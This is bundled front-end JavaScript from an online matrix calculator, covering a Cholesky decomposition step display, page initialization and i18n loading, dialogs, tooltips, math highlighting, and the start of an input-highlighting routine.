    html += i18n.CholeskyDecompositionLink;
    html += "</div>";
    html += "<div>"; //TODO: show that conjugate(l_(1,1)) == l_(1, 1) is used

    var M = nsL.multiply(nsL.transpose().map(function (e, i, j) { return isReal || i === j ? e : e.complexConjugate(); }));
    printOptions = Object.assign({}, printOptions, {
      printId: true
    });
    var nsA = A.map(function (e, i, j) {
      return new NonSimplifiedExpression(e);
    });
    nsL = nsL.map(function (e, i, j) {
      return new NonSimplifiedExpression(e);
    });
    M = M.map(function (e, i, j) {
      return new NonSimplifiedExpression(e);
    });
    html += "<math>";
    html += Expression.p("A=L*T=M", {
      A: new Expression.Matrix(nsA),
      L: new Expression.Matrix(nsL),
      T: new Expression.Matrix(nsL.transpose().map(function (e, i, j) { return isReal || i >= j ? e : e.complexConjugate(); })),
      M: new Expression.Matrix(M)
    }, printOptions);
    html += "</math>";
    html += "</div>";
    html += "<div>";
    html += i18n.CholeskyDecomposition.then; //?

    html += "</div>";
    var L = new Array(n);

    for (var i = 0; i < n; i += 1) {
      L[i] = new Array(n);

      for (var j = 0; j < n; j += 1) {
        L[i][j] = Expression.ZERO;
      }
    }

    html += '<ul class="list-unstyled">'; //?

    for (var j = 0; j < n; j += 1) {
      for (var i = j; i < n; i += 1) {
        var nsE = null;
        var e = null;
        var radicand = null;

        if (j === i) {
          var nsSum = null;
          var sum = null;

          for (var k = 0; k < j; k += 1) {
            var nsS = isReal ? nsL.e(j, k).pow(Expression.TWO) : nsL.e(j, k).multiply(nsL.e(j, k).complexConjugate());
            nsSum = nsSum == null ? nsS : nsSum.add(nsS);
            var s = isReal ? L[j][k].pow(Expression.TWO) : L[j][k].multiply(L[j][k].complexConjugate());
            sum = sum == null ? s : sum.add(s);
          }

          var nsX = nsSum == null ? nsA.e(j, j) : nsA.e(j, j).subtract(nsSum);
          var x = sum == null ? nsA.e(j, j) : nsA.e(j, j).subtract(sum); //?
          //if (x instanceof Expression.Integer && x.compareTo(Expression.ZERO) < 0) {
          //  throw new RangeError("NonPositiveDefiniteMatrix");
          //}

          radicand = x;
          nsE = nsX.squareRoot();
          e = x.squareRoot();
        } else {
          var nsSum = null;
          var sum = null;

          for (var k = 0; k < j; k += 1) {
            var nsX = isReal ? nsL.e(i, k).multiply(nsL.e(j, k)) : nsL.e(i, k).multiply(nsL.e(j, k).complexConjugate());
            var x = isReal ? L[i][k].multiply(L[j][k]) : L[i][k].multiply(L[j][k].complexConjugate());
            nsSum = nsSum == null ? nsX : nsSum.add(nsX);
            sum = sum == null ? x : sum.add(x);
          }

          nsE = (nsSum == null ? nsA.e(i, j) : nsA.e(i, j).subtract(nsSum)).divide(nsL.e(j, j));
          e = (sum == null ? nsA.e(i, j) : nsA.e(i, j).subtract(sum)).divide(L[j][j]);
        }

        html += "<li>";
        html += "<math>";
        var x = new NonSimplifiedExpression(M.e(i, j).unwrap());
        var y = new NonSimplifiedExpression(nsA.e(i, j).unwrap());
        html += '<mrow>';
        html += x.toMathML(printOptions) + '<mo>=</mo>' + y.toMathML(printOptions);
        html += '</mrow>';
        var highlights = "";
        highlights += "<a class=\"a-highlight\" data-for=\"" + x.getId() + "\" data-highlight=\"" + M.e(i, j).getIds() + "\"></a>";
        highlights += "<a class=\"a-highlight\" data-for=\"" + y.getId() + "\" data-highlight=\"" + nsA.e(i, j).getIds() + "\"></a>";
        html += '<mo stretchy="false" lspace="0.68em" rspace="0.68em">&rArr;</mo>';
        html += '<mrow>';
        html += nsL.e(i, j).toMathML(printOptions);

        if (i !== 0 || j !== 0) {
          // nothing to substitute for the first element
          html += "<mo>=</mo>";
          html += nsE.toMathML(printOptions); // before substitutions

          html += "<mo>=</mo>";
          html += e.toMathML(printOptions); // after substitutions
        }

        if (radicand != null) {
          html += "<mo>=</mo>";
          radicand = radicand.simplify();
          html += new NonSimplifiedExpression(radicand).squareRoot().toMathML(printOptions); // after simplification of the expression under the radical symbol

          nsE = null;

          try {
            nsE = radicand.squareRoot();
          } catch (error) {
            //TODO: !!!
            console.log(error);
          }

          if (nsE == null || !Expression._isPositive(radicand)) {
            try {
              nsE = radicand.negate().squareRoot();
            } catch (error2) {
              console.log(error2);
            }

            var ok = nsE != null || !Expression._isPositive(radicand); //TODO: fix

            html += "</mrow>";
            html += "</math>";
            html += highlights;
            html += "<span>";
            html += " - ";
            html += !ok ? i18n.CholeskyDecomposition.sorryCannotWork : i18n.CholeskyDecomposition.theMatrixIsNotPositiveDefinite;
            html += "</span>";
            html += "</li>";
            html += '</ul>';
            return html;
          }
        }

        var r = e.simplify(); //TODO: subs

        if (radicand == null || !r.equals(new Expression.SquareRoot(radicand))) {
          html += "<mo>=</mo>";
          html += r.toMathML(printOptions); // after simplification
        }

        html += '</mrow>';
        html += "</math>";
        html += highlights;
        html += "</li>";
        L[i][j] = new NonSimplifiedExpression(r);
      }
    }

    html += '</ul>';
    var LL = Matrix.padRows(L, null);
    html += "<div>";
    html += i18n.CholeskyDecomposition.then; //?

    html += "</div>";
    html += "<div>";
    html += "<math>";
    html += Expression.p("L=X", {
      X: new Expression.Matrix(LL)
    }, printOptions);
    html += "</math>";
    html += "</div>";
    return html;
  }
});
})();
/*jslint plusplus: true, vars: true, indent: 2 */
/*global document, window */

(function () {
  "use strict";

  function PageUtils() {
  }

  PageUtils.on = function (eventType, selector, listener) {
    PageUtils.initialize(selector, function (element) {
      element.addEventListener(eventType, listener, false);
    });
  };

  PageUtils.escapeHTML = function (s) {
    return s.replace(/&/g, "&amp;")
            .replace(/"/g, "&quot;")
            .replace(/</g, "&lt;")
            .replace(/>/g, "&gt;");
  };

  PageUtils.$import = function (src) {
    //Note: "import" keyword cannot be used in IE 11
    return new Promise(function (resolve, reject) {
      var script = document.createElement("script");
      script.async = true;
      script.src = src;
      script.setAttribute("crossorigin", "anonymous");
      document.head.appendChild(script);
      script.onload = function () {
        resolve();
      };
      script.onerror = function () {
        reject();
      };
    });
  };

  var initializers = {className: {}, tagName: {}};

  var checkElement = function (element) {
    var tagName = element.tagName.toLowerCase();
    if (element.hasAttributes() || tagName === "details") { // for performance
      var initialized = element.getAttribute("data-i");
      if (initialized == undefined) {
        var callback = initializers.tagName[tagName];
        if (callback != undefined) {
          element.setAttribute("data-i", "1");
          callback(element);
        }
        var classList = element.classList;
        if (classList != undefined) { // <math> in IE 11, Opera 12 (during the check for MathML support)
          var classListLength = classList.length;
          if (classListLength !== 0) {
            element.setAttribute("data-i", "1");
            var t = 0;
            for (var k = 0; k < classListLength; k += 1) {
              var className = classList[k];
              var callback = initializers.className[className];
              if (callback != undefined) {
                if (t > 0) {
                  throw new TypeError(classList.toString());
                }
                t += 1;
                callback(element);
              }
            }
          }
        }
      }
    }
  };

  var checkCustomPaint = function (element) {
    if (element.getAttribute("data-custom-paint") != undefined) {
      if (element.getAttribute("data-p") == undefined && element.getBoundingClientRect().top !== 0) {
        element.setAttribute("data-p", "1");
        element.dispatchEvent(new Event('custom-paint', {bubbles: true}));
      }
    }
  };

  var checkSubtree = function (element) {
    checkElement(element);
    var firstElementChild = element.firstElementChild;
    while (firstElementChild != undefined) {
      checkSubtree(firstElementChild);
      firstElementChild = firstElementChild.nextElementSibling;
    }
  };

  var checkSubtree2 = function (element) {
    checkCustomPaint(element);
    var firstElementChild = element.firstElementChild;
    while (firstElementChild != undefined) {
      checkSubtree2(firstElementChild);
      firstElementChild = firstElementChild.nextElementSibling;
    }
  };

  var started = false;

  PageUtils.initialize = function (selector, callback) {
    if (selector.startsWith(".")) {
      var className = selector.slice(1);
      if (started || initializers.className[className] != undefined) {
        throw new TypeError(className);
      }
      initializers.className[className] = callback;
    } else {
      initializers.tagName[selector] = callback;
    }
  };

  var observe = function () {
    if (!started) {
      started = true;
      // some initializers can modify DOM, so it is important to call `checkSubtree` after `observer.observe`
      checkSubtree(document.body);
      checkSubtree2(document.body);
    }
  };

  var preObserve = function () {
    if (true) {
      // trying to initialize page earlier (before first paint (?))
      observe();
    }
    //loadI18n();
  };

  PageUtils.waitI18n = function (callback) {
    if (globalThis.i18n != null) {
      callback();
    } else {
      window.addEventListener('i18n-loaded', function (event) {
        callback();
      }, {once: true});
    }
  };
  
  // document.documentElement.lang === PageUtils.ROOT_SITE_LANG ? '.' : '..'
  PageUtils.ROOT_PATH = document.documentElement.getAttribute('data-root-path') || (document.currentScript.src.replace(/\?[\s\S]*/g, '') + '/..');

  var loadI18n = function () {
    var lang = document.documentElement.lang;
    //! the lang is set to iw-x-mtfrom-en at https://translate.googleusercontent.com/translate_c?depth=1&hl=iw&prev=search&rurl=translate.google.co.il&sl=en&u=https://matrixcalc.org/en/ - TODO - check
    if (lang.indexOf('-mtfrom-') !== -1) {
      lang = lang.slice(lang.indexOf('-mtfrom-') + '-mtfrom-'.length);
    }
    var i18nUrl = PageUtils.ROOT_PATH + 'i18n-' + lang + '.json' + (document.documentElement.getAttribute('data-version-tag') || '');
    // Use `cache: 'force-cache'` to workaround the issue, that Cache-Control is different for HTML/JS/CSS and JSON
    // As we have a version tag in the query string, it should be fine.
    fetch(i18nUrl, {credentials: 'same-origin', cache: 'force-cache'}).then(function (response) {
      return response.json();
    }).then(function (i18n) {
      globalThis.i18n = i18n;
      if (i18n.errors == null) {
        window.location.reload(true);//!
      }
      //observe();
      window.dispatchEvent(new Event('i18n-loaded')); // https://stackoverflow.com/a/42837595/839199
    });
  };
  loadI18n();

  document.addEventListener("DOMContentLoaded", function (event) {
    //TODO: remove
    var scriptVersion = '?20221031T220401Z';
    var htmlVersion = document.documentElement.getAttribute('data-version-tag') || scriptVersion;
    if ((scriptVersion !== htmlVersion) && (window.location.protocol === 'http:' || window.location.protocol === 'https:') && Object.keys != null && Object.keys(initializers).length !== 0 && window.fetch != null) {
      // a workaround for a caching bug in browsers
      // https://bugs.chromium.org/p/chromium/issues/detail?id=899752 - ?
      // Chrome/70
      // also there are some another error in Firefox, seems
      // Chrome - only for http: protocol, seems
      // Firefox - any protocol - ? (https:)
      fetch(window.location.href.replace(/^http\:/g, 'https:'), {cache: "reload"}).then(function (response) {
        return response.text();
      }).then(function (text) {
        var parser = new DOMParser();
        var doc = parser.parseFromString(text, "text/html");
        document.body.innerHTML = doc.body.innerHTML;
        preObserve();
      })["catch"](function () {
        preObserve();//!
      });
    } else {
      preObserve();
    }
  }, {once: true});

  // workaround for browsers, which do not support MutationObserver
  PageUtils.check = function (element) {
    checkSubtree(element);
    checkSubtree2(element);
  };

  PageUtils.check1 = function (element) {
    checkSubtree(element);
    checkSubtree2(element);
  };

  //Note: `Utils` is not a good name (somehow web clients may already have a variable with that name)
  globalThis.PageUtils = PageUtils;

}());

/*global document, window */

(function () {
  "use strict";

  var ANIMATION_DURATION = 120;

  var animateOnClose = function (dialog) {
    dialog.style.display = "";
    if (dialog.animate != undefined) {
      dialog.style.display = "block";
      dialog.style.opacity = "0";
      dialog.style.transform = "scale(0.75)";
      dialog.animate([
        {transform: "scale(1.3333333333333333)", opacity: "1"},
        {transform: "scale(1)", opacity: "0"}
      ], {
        duration: ANIMATION_DURATION,
        composite: "add"
      });
      window.setTimeout(function () {
        dialog.style.display = "";
      }, ANIMATION_DURATION);
    }
    var backdrop = document.getElementById(dialog.getAttribute("data-backdrop-id"));
    if (backdrop != undefined) {
      if (backdrop.animate != undefined) {
        backdrop.style.opacity = "0";
        backdrop.animate([
          {opacity: "1"},
          {opacity: "0"}
        ], {
          duration: ANIMATION_DURATION,
          composite: "add"
        });
        window.setTimeout(function () {
          if (backdrop.parentNode != undefined) {
            backdrop.parentNode.removeChild(backdrop);
          }
        }, ANIMATION_DURATION);
      } else {
        backdrop.parentNode.removeChild(backdrop);
      }
    }
  };

  var animateOnShow = function (dialog) {
    dialog.style.display = "block"; // set display to "block" to play animation on closing later
    if (dialog.animate != undefined) {
      dialog.style.opacity = "1";
      dialog.style.transform = "scale(1)";
      dialog.animate([
        {transform: "scale(0.75)", opacity: "-1"},
        {transform: "scale(1)", opacity: "0"}
      ], {
        duration: ANIMATION_DURATION,
        composite: "add"
      });
    }
    var backdrop = document.getElementById(dialog.getAttribute("data-backdrop-id"));
    if (backdrop != undefined) {
      if (backdrop.animate != undefined) {
        backdrop.style.opacity = "1";
        backdrop.animate([
          {opacity: "-1"},
          {opacity: "0"}
        ], {
          duration: ANIMATION_DURATION,
          composite: "add"
        });
      }
    }
  };

if (window.MutationObserver != null) {
  document.addEventListener('DOMContentLoaded', function (event) {
    // with "animationstart" there is some flickering...
    // ... trying to use MutationObserver
    var observer = new MutationObserver(function (mutationList) {
      for (var i = 0; i < mutationList.length; i += 1) {
        var mutation = mutationList[i];
        var target = mutation.target;
        if (target.tagName.toLowerCase() !== "details") {//TODO: ?
          if (target.getAttribute("open") != null) {
            animateOnShow(target);
          } else {
            animateOnClose(target);
          }
        }
      }
    });
    observer.observe(document.body, {
      attributes: true,
      attributeFilter: ["open"],
      subtree: true
    });
  }, {once: true});
}

  function Dialog() {
  }

  var idCounter = 0;
  // "Cancel", "OK", "Close"
  // for use as a modal dialog
  Dialog.standard = function (contentHTML, buttonsHTML) {
    var dialog = document.createElement("dialog");
    if (dialog.initDialog != null) {
      dialog.initDialog();
    }
    var contentId = "dialog-content";
    dialog.classList.toggle("standard-dialog", true);
    dialog.setAttribute("aria-describedby", contentId);
    //?
    dialog.innerHTML = "<form method=\"dialog\">" +
                       "<button type=\"submit\" class=\"close\" aria-label=\"" + i18n.misc.close + "\">ðŸ—™</button>" +
                       "<div id=\"" + contentId + "\" class=\"content\">" + contentHTML + "</div>" +
                       "<div class=\"buttons\">" + buttonsHTML + "</div>" +
                       "</form>";
    document.body.appendChild(dialog);
    var backdropId = "backdrop" + (idCounter += 1).toString();
    dialog.setAttribute("data-backdrop-id", backdropId);
    var backdrop = document.createElement("div");
    backdrop.id = dialog.getAttribute("data-backdrop-id");
    backdrop.classList.toggle("backdrop", true);
    document.body.appendChild(backdrop);
    dialog.addEventListener("close", function (event) {
      window.setTimeout(function () {
        dialog.parentNode.removeChild(dialog);
      }, Math.max(2000, ANIMATION_DURATION));
    }, false);
    var lastActiveElement = document.activeElement;
    dialog.addEventListener("close", function (event) {
      if (lastActiveElement != null) {
        lastActiveElement.focus();
      }
    }, false);
    if (document.activeElement != null) {
      dialog.style.visibility = "hidden";
      dialog.style.display = "block";
      dialog.style.position = 'absolute';
      var rect = document.activeElement.getBoundingClientRect();
      var left = (rect.left + rect.right) / 2 - dialog.offsetWidth / 2;
      var top = (rect.top + rect.bottom) / 2 - dialog.offsetHeight / 2;
      left = Math.min(left, document.documentElement.clientWidth - dialog.offsetWidth);
      top = Math.min(top, document.documentElement.clientHeight - dialog.offsetHeight);
      left = Math.max(left, 0);
      top = Math.max(top, 0);
      left = window.pageXOffset + left;
      top = window.pageYOffset + top;
      dialog.style.left = left + 'px';
      dialog.style.top = top + 'px';
      dialog.style.right = 'auto';
      dialog.style.bottom = 'auto';
      dialog.style.visibility = "";
      dialog.style.display = "";
    }
    dialog.showModal();
    return dialog;
  };

  Dialog.alert = function (contentHTML) {
    window.setTimeout(function () { // hack to prevent the closing of new dialog immediately in Chrome
      var dialog = Dialog.standard(contentHTML, "<button autofocus=\"autofocus\" type=\"submit\">OK</button>");
    }, 0);
  };

  //Dialog.promptNumber = function (title, min, max, callback) {
  //  var dialog = Dialog.standard("<h3>" + title + "</h3>" + "<div><input type=\"number\" autofocus=\"autofocus\" required=\"required\" min=\"" + min + "\" max=\"" + max + "\" step=\"1\" /></div>", "<button autofocus=\"autofocus\" type=\"reset\">CANCEL</button><button type=\"submit\">OK</button>");
  //  dialog.addEventListener("close", function (event) {
  //    if (dialog.returnValue != undefined) {
  //      callback(dialog.querySelector("input").value);
  //    }
  //  }, false);
  //  return dialog;
  //};

  globalThis.Dialog = Dialog;

}());

/*global document, Dialog */

(function () {
  "use strict";

  var oldHighlights = undefined;
  var highlight = function (element) {
    if (oldHighlights != undefined) {
      for (var i = 0; i < oldHighlights.length; i += 1) {
        var t = document.getElementById(oldHighlights[i]);
        if (t != undefined) {
          t.removeAttribute("mathbackground");
          t.removeAttribute("mathcolor");
        }
      }
      oldHighlights = undefined;
    }
    if (element != undefined) {
      var highlight = element.getAttribute("data-highlight"); // #id1, #id2, ...
      if (highlight != undefined) {
        var newHighlights = highlight.replace(/[#\s]/g, "").split(",");
        for (var j = 0; j < newHighlights.length; j += 1) {
          var e = document.getElementById(newHighlights[j]);
          if (e != undefined) {
            e.setAttribute("mathbackground", "#FAEBD7");
            e.setAttribute("mathcolor", "#3C78C2");
          }
        }
        oldHighlights = newHighlights;
      }
    }
  };

  var tooltip = null;

  var keyDownTarget = undefined;

  var onKeyDown = function (event) {
    var DOM_VK_ESCAPE = 27;
    if (event.keyCode === DOM_VK_ESCAPE && !event.ctrlKey && !event.altKey && !event.shiftKey && !event.metaKey && !event.defaultPrevented) {
      event.preventDefault();
      showTooltip(undefined);
    }
  };

  var showTooltip = function (element) {
    if (keyDownTarget != undefined) {
      keyDownTarget.removeEventListener("keydown", onKeyDown, false);
      //TODO: should this attribute always point to the description (?)
      keyDownTarget.removeAttribute("aria-describedby");
      keyDownTarget = undefined;
    }
    if (tooltip == null) {
      tooltip = document.createElement("div");
      tooltip.id = "highlight-tooltip";
      tooltip.setAttribute("role", "tooltip");
      tooltip.classList.toggle("tooltip-dialog", true);
    }
    if (tooltip.getAttribute("open") != undefined && element == undefined) {
      tooltip.removeAttribute("open");
    }
    if (element != undefined) {
      var tooltipContainer = element;
      var tooltipId = element.getAttribute("data-tooltip");//TODO: remove
      if (tooltipId != undefined) {
        tooltipContainer = document.getElementById(tooltipId);
      }
        keyDownTarget = document.getElementById(element.getAttribute("data-for"));
        var rect = keyDownTarget.getBoundingClientRect();
        keyDownTarget.setAttribute("aria-describedby", tooltip.id);
        keyDownTarget.addEventListener("keydown", onKeyDown, false);
        if (tooltip.parentNode == undefined) {
          document.body.appendChild(tooltip);
        }
        tooltip.textContent = "";
        var c = tooltipContainer.cloneNode(true);
        while (c.firstChild != undefined) {
          tooltip.appendChild(c.firstChild);
        }
        //tooltip.style.transform = "scale(1)";
        tooltip.style.visibility = "hidden";
        var display = tooltip.style.display;
        tooltip.style.display = "block";
        tooltip.style.position = "absolute";
        tooltip.style.right = "auto"; // Chrome 49 with html[dir="rtl"] uses 0px from right
        tooltip.style.top = (window.pageYOffset + rect.top - tooltip.offsetHeight - 8.5) + 'px';
        tooltip.style.left = (window.pageXOffset + (rect.left + rect.right) / 2 - tooltip.offsetWidth / 2) + "px";
        tooltip.style.bottom = "auto";
        tooltip.style.display = display;
        tooltip.style.visibility = "";
        //tooltip.style.transform = "";
        if (tooltip.getAttribute("open") == undefined) {
          tooltip.setAttribute("open", "open"); // "show" moves the focus in Chrome
        }
    }
  };

  var f = function (highlight) {

    var hoveredElements = [];
    var focusedElements = [];

    return function (element) {
      var x = document.getElementById(element.getAttribute("data-for"));

      //!
      // The idea is to set tabindex="0" only for cells which have a tooltip or a "highlight"
      x.setAttribute("tabindex", "0");
      var tagName = x.tagName.toLowerCase();
      if (tagName === 'mrow' || tagName === 'mtd') {
        if (x.tabIndex == null) {
          x.setAttribute("href", "#");
        }
      } else {
        if (tagName !== 'a') {
          throw new RangeError(tagName);
        }
      }
      //!

      var highlightInternal = function () {
        window.setTimeout(function () {
        highlight(hoveredElements.length !== 0 ? hoveredElements[hoveredElements.length - 1] : (focusedElements.length !== 0 ? focusedElements[focusedElements.length - 1] : undefined));
        }, 0);
      };

      x.addEventListener("mouseenter", function (event) {
        hoveredElements.push(element);
        highlightInternal();
      }, false);
      x.addEventListener("mouseleave", function (event) {
        hoveredElements.pop();
        highlightInternal();
      }, false);
      x.addEventListener("focus", function (event) {
        focusedElements.push(element);
        highlightInternal();
      }, false);
      x.addEventListener("blur", function (event) {
        focusedElements.pop();
        highlightInternal();
      }, false);
    };

  };

  globalThis.initializeAHighlight = f(highlight);
  globalThis.initializeATooltip = f(showTooltip);

}());

/*global window, document, Dialog*/

window.reportValidity = function (input, validationMessage) {
  "use strict";
  var tooltip = document.createElement("div");
  tooltip.setAttribute("role", "tooltip");
  tooltip.id = "report-validity-tooltip-for-" + input.id;
  tooltip.classList.toggle("tooltip", true);
  tooltip.classList.toggle("tooltip-dialog", true);//?
  var tooltipArrowId = "tooltip-arrow-" + input.id;
  tooltip.innerHTML = "<span class=\"exclamation\">!</span> " + validationMessage + "<div class=\"tooltip-arrow-wrapper\"><div id=\"" + tooltipArrowId + "\" class=\"tooltip-arrow\"></div></div>";
  document.body.appendChild(tooltip);

  input.setAttribute("aria-describedby", tooltip.id);
  input.focus();

  var inputRect = input.getBoundingClientRect();

  tooltip.style.visibility = "hidden";
  tooltip.style.display = "block";
  var rect = tooltip.getBoundingClientRect();
  var style = window.getComputedStyle(tooltip, undefined);
  var marginLeft = Number.parseFloat(style.marginLeft);
  var tooltipArrow = document.getElementById(tooltipArrowId);
  var arrowRect = tooltipArrow.getBoundingClientRect();
  tooltip.style.display = "";
  tooltip.style.visibility = "";

  var left = (inputRect.left + inputRect.right) / 2 - ((arrowRect.right - arrowRect.left) / 2 + marginLeft + arrowRect.left - rect.left);
  var top = inputRect.bottom + (arrowRect.bottom - arrowRect.top) * 0.15;
  // (17 + 2) * Math.SQRT2 / 2 + 0.25 * 17 + 1 + 0.5 * 17 - (17 + 2) * (Math.SQRT2 - 1) / 2
  // (17 + 2) * Math.SQRT2 * 0.15

  tooltip.style.position = 'absolute';
  tooltip.style.right = 'auto';
  tooltip.style.bottom = 'auto';
  tooltip.style.left = (window.pageXOffset + left) + 'px';
  tooltip.style.top = (window.pageYOffset + top) + 'px';
  tooltip.setAttribute("open", "open"); // "show" moves the focus in Chrome

  var close = undefined;
  var onKeyDown = undefined;
  var timeoutId = 0;

  close = function (event) {
    window.clearTimeout(timeoutId);
    input.removeEventListener("input", close, false);
    input.removeEventListener("blur", close, false);
    input.removeEventListener("keydown", onKeyDown, false);
    input.removeAttribute("aria-describedby");
    tooltip.id = ""; //! test case: trigger the tooltip twice
    tooltipArrow.id = "";
    tooltip.removeAttribute("open");
    window.setTimeout(function () {
      tooltip.parentNode.removeChild(tooltip);
    }, 3000);
  };
  onKeyDown = function (event) {
    var DOM_VK_ESCAPE = 27;
    if (event.keyCode === DOM_VK_ESCAPE && !event.ctrlKey && !event.altKey && !event.shiftKey && !event.metaKey && !event.defaultPrevented) {
      event.preventDefault();
      close();
    }
  };
  timeoutId = window.setTimeout(function () {
    close(undefined);
  }, 4000);
  input.addEventListener("input", close, false);
  input.addEventListener("blur", close, false);
  input.addEventListener("keydown", onKeyDown, false);

};

/*global document*/

(function () {
  "use strict";

  function CustomMenclose() {
  }
  CustomMenclose.getPointByCell = function (paddingRect, rows, indexes) {
    var a = indexes[0];
    var b = indexes[1];
    var e = rows[a][b];
    var r = e.getBoundingClientRect();
    return {
      x: (r.left + r.right) / 2 - paddingRect.left,
      y: (r.top + r.bottom) / 2 - paddingRect.top
    };
  };
  CustomMenclose.paint = function (event) {
    var paddingRect = this.getBoundingClientRect();
    var width = paddingRect.right - paddingRect.left;
    var height = paddingRect.bottom - paddingRect.top;
    var svg = "";
    var cells = JSON.parse(this.getAttribute("data-cells"));
    var color = this.getAttribute("data-color");
    var strokeStyle = color === "0a" ? "#D64040" : (color === "0" ? "#F7D9D9" : (color === "1a" ? "#4040D6" : (color === "1" ? "#D9D9F7" : "")));
    var lineWidth = 1.25;
    var table = this.querySelector("mtable");
    var rows = [];
    var c = table.firstElementChild;
    while (c != undefined) {
      if (c.tagName.toLowerCase() === 'mtr') {
        var row = [];
        var t = c.firstElementChild;
        while (t != undefined) {
          if (t.tagName.toLowerCase() === 'mtd') {
            row.push(t);
          }
          t = t.nextElementSibling;
        }
        rows.push(row);
      }
      c = c.nextElementSibling;
    }
    for (var i = 0; i < cells.length; i += 1) {
      var p1 = CustomMenclose.getPointByCell(paddingRect, rows, cells[i]);
      var p2 = CustomMenclose.getPointByCell(paddingRect, rows, i === cells.length - 1 ? cells[0] : cells[i + 1]);
      svg += "<line x1=\"" + p1.x.toString() + "\" y1=\"" + p1.y.toString() + "\" x2=\"" + p2.x.toString() + "\" y2=\"" + p2.y.toString() + "\" stroke=\"" + strokeStyle + "\" stroke-width=\"" + lineWidth.toString() + "\" />";
    }
    var backgroundImage = "data:image/svg+xml," + encodeURIComponent("<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"" + width + "\" height=\"" + height + "\" viewBox=\"0 0 " + width + " " + height + "\">" + svg + "</svg>");
    this.style.backgroundImage = "url(\"" + backgroundImage + "\")";
    this.style.backgroundSize = "auto auto";
  };

  document.addEventListener("custom-paint", function (event) {
    if (event.target.getAttribute("data-custom-paint") === "custom-menclose") {
      CustomMenclose.paint.call(event.target, event);
    }
  }, false);

}());

/*global window, document, console, Node, Event*/

//TODO: optimize

(function () {
  "use strict";

  var scrollEventSupport = undefined;
  var callbacks = [];
  var isScrollEventSupported = function (node, callback) {
    if (node.tagName.toLowerCase() !== 'input') {
      callback(true);
    }
    if (scrollEventSupport == null && callbacks.length === 0) {
      callbacks.push(callback);
      var input = document.createElement('input');
      var c = 0;
      input.addEventListener('scroll', function (event) {
        c += 1;
      }, false);
      document.body.appendChild(input);
      input.value = new Array(1024).join('x');
      //input.setSelectionRange(input.value.length, input.value.length);
      input.scrollLeft = 10000;
      input.visibility = 'hidden';
      window.requestAnimationFrame(function () {
        window.requestAnimationFrame(function () {
          input.parentNode.removeChild(input);
          scrollEventSupport = c !== 0;
          for (var i = 0; i < callbacks.length; i += 1) {
            callbacks[i](scrollEventSupport);
          }
          callbacks.length = 0;
        });
      });
    } else if (callbacks.length !== 0) {
      callbacks.push(callback);
    } else {
      callback(scrollEventSupport);
    }
  };

  var selectionChangeEventSupport = undefined;
  var isSelectionChangeEventSupported = function (node) {
    if (!('onselectionchange' in document)) {
      return false;
    }
    if (node.hasAttribute('contenteditable')) {
      return true;
    }
    if (selectionChangeEventSupport == null) {
      var div = document.createElement('div');
      var input = document.createElement('input');
      div.appendChild(input);
      document.body.appendChild(div);
      input.value = 'x';
      input.select();
      var selection = window.getSelection();
      selectionChangeEventSupport = selection.anchorOffset === selection.focusOffset && selection.anchorNode === div && selection.focusNode === div;
      div.parentNode.removeChild(div);
    }
    return selectionChangeEventSupport;
  };

var queue = [];
var initializeAInput = function (container) {
  var input = container.firstElementChild;
  if (input.tagName.toLowerCase() !== 'input' && input.tagName.toLowerCase() !== 'textarea' && !input.hasAttribute('contenteditable')) {
    throw new TypeError();
  }
  var idPrefix = input.id + '=';

  // see https://github.com/kueblc/LDT

  var inputStyle = window.getComputedStyle(input, undefined);

  // FF does not like font
  var fontSize = inputStyle.fontSize;
  var fontFamily = inputStyle.fontFamily;
  var fontWeight = inputStyle.fontWeight;
  var lineHeight = inputStyle.lineHeight;
  var textAlign = inputStyle.textAlign;

  var marginLeft = Number.parseFloat(inputStyle.marginLeft);
  var marginTop = Number.parseFloat(inputStyle.marginTop);
  var marginRight = Number.parseFloat(inputStyle.marginRight);
  var marginBottom = Number.parseFloat(inputStyle.marginBottom);
  var paddingLeft = Number.parseFloat(inputStyle.paddingLeft);
  var paddingTop = Number.parseFloat(inputStyle.paddingTop);
  var paddingRight = Number.parseFloat(inputStyle.paddingRight);
  var paddingBottom = Number.parseFloat(inputStyle.paddingBottom);

  // when the width of a textarea is small, paddingRight will not be included in scrolling area,
  // but this is not true for an input, in Firefox - for both
  // see https://developer.mozilla.org/en-US/docs/Mozilla/Gecko/Chrome/CSS/overflow-clip-box
  if (input.tagName.toLowerCase() === "input") {
    // Firefox, Edge, Chrome
    marginLeft += paddingLeft;
    marginTop += paddingTop;
    marginRight += paddingRight;
    marginBottom += paddingBottom;
    paddingLeft = 0;
    paddingTop = 0;
    paddingRight = 0;
    paddingBottom = 0;
  } else {
    if (paddingRight !== 0 || paddingBottom !== 0) {
      console.warn("Set paddingRight and paddingBottom to zero for <textarea> elements");
    }
  }

  var backgroundElement = document.createElement("div");
  backgroundElement.style.fontSize = fontSize;
  backgroundElement.style.fontFamily = fontFamily;
  backgroundElement.style.fontWeight = fontWeight;
  backgroundElement.style.lineHeight = lineHeight;
  backgroundElement.style.textAlign = textAlign;
  backgroundElement.style.paddingLeft = paddingLeft + "px";
  backgroundElement.style.paddingTop = paddingTop + "px";
  backgroundElement.style.paddingRight = paddingRight + "px";
  backgroundElement.style.paddingBottom = paddingBottom + "px";
  backgroundElement.setAttribute('translate', 'no'); // for Google Translate
  backgroundElement.setAttribute('inert', 'inert');
  if (queue.length === 0) {
    window.requestAnimationFrame(function () {
      for (var i = 0; i < queue.length; i += 1) {
        queue[i]();
      }
      queue.length = 0;
    });
  }
  queue.push(function () { // relayout
    input.parentNode.insertBefore(backgroundElement, input);
  });

  var updateTokenNode = function (span, text, tokenClassName, className) {
    var classList = span.classList;
    for (var i = 0; i < classList.length; i += 1) {
      if (classList[i] !== tokenClassName && classList[i] !== className) {
        classList.toggle(classList[i], false);
      }
    }
    if (tokenClassName != null) {
      span.classList.toggle(tokenClassName, true);
    }
    if (className != null) {
      span.classList.toggle(className, true);
    }
    if (span.firstChild == null || text === "") {
      throw new TypeError("Something happens with undo/redo history in Chrome when text node is added/removed.");
    }
    if (span.firstChild.data !== text) {
      span.firstChild.data = text; //Note: on the TextNode
    }
  };

  var add = function (text, tokenClassName, className, div) {
    var span = document.createElement("span");
    span.textContent = " ";
    updateTokenNode(span, text, tokenClassName, className);
    div.appendChild(span);
  };

  var getBracketMarks = function (value, inputSelectionStart) {
    if (inputSelectionStart == null) {
      return {
        first: undefined,
        second: undefined
      };
    }
    var selectionStart = Math.max(inputSelectionStart - 1, 0);
    var c = 0;
    var step = 0;
    var pair = 0;
